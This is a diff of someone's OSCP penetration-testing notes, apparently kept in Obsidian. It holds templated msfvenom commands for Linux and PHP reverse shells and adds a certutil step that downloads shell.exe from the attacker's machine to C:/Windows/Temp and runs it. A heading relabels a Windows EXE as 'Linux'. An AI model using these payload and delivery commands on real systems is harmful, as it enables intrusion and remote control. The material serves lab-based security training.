@@ -6,7 +6,7 @@ msfvenom -l payloads
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
 ```
 
-Windows TCP Reverse shell EXE | PORT 445 | shell.exe
+Linux TCP Reverse shell EXE | PORT 445 | shell.exe
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
@@ -14,7 +14,6 @@ const command = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=4
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-
 
 PHP reverse shell | PORT 21 | `phpreverseshell.php`
 ```dataviewjs
@@ -24,7 +23,18 @@ const command = `msfvenom -p php/reverse_php LHOST=${KaliIP} LPORT=21 -f raw > p
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Download SHELL.EXE onto target
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
+const command = `certutil.exe -f -urlcache -split http://${KaliIP}/shell.exe C:/Windows/Temp/shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Execute SHELL.EXE
+```powershell
+C:/Windows/Temp/shell.exe
+```
 #### Call MSFvenom
 
   Crafting Payloads with MSFvenom
